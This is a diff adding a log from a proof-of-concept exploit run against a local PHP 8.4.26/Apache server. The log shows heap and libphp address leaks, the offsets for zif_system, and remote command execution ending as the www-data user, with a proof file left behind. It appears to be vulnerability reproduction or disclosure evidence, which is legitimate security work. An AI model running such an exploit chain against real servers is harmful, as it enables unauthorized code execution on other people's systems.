@@ -1,0 +1,18 @@
+> python3 -u poc.py --url http://127.0.0.1:18082/
+
+[*] fingerprint status=200 php=PHP/8.4.26 server=Apache/2.4.69 (Debian)
+[*] profile calibration -> official-php-8.4.26-apache-trixie-stock-preapp
+[*] profile=official-php-8.4.26-apache-trixie-stock-preapp build=official-php-8.4.26-apache-trixie-amd64 layout=trixie-reproducer-v1
+[*] offsets source=registry build=official-php-8.4.26-apache-trixie-amd64 zif=0x465370 dtor=0x65eb60 hash=0x690d8
+[*] remote proof path: /p5585453c
+[*] remote proof preflight status=404
+[*] warm-up GET status=200
+[*] pre-app heap attempt 1/24
+[+] heap chunk base: 0x7fd732800000
+[*] pre-app libphp attempt 1/24
+[+] libphp base: 0x7fd734569000
+[*] execution addresses: table=0x7fd7328690d8 zif_system=0x7fd7349ce370
+[*] pre-app execution attempt 1/24
+[!] execution attempt ended: RemoteDisconnected: Remote end closed connection without response
+PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+REMOTE_PROOF_REMAINS: /p5585453c
